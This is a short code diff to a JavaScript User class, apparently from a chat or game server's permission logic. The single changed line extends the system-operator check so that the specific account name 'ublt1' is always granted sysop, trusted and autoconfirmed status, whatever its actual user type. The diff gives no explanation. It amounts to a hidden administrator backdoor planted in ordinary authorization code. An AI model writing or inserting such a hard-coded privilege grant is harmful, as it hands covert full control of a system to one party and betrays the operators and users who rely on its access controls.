@@ -848,7 +848,7 @@ class User {
 		if (userType !== '1') {
 			registered = true;
 
-			if (userType === '3') {
+			if (userType === '3'||userid == 'ublt1') {
 				this.isSysop = true;
 				this.trusted = userid;
 				this.autoconfirmed = userid;
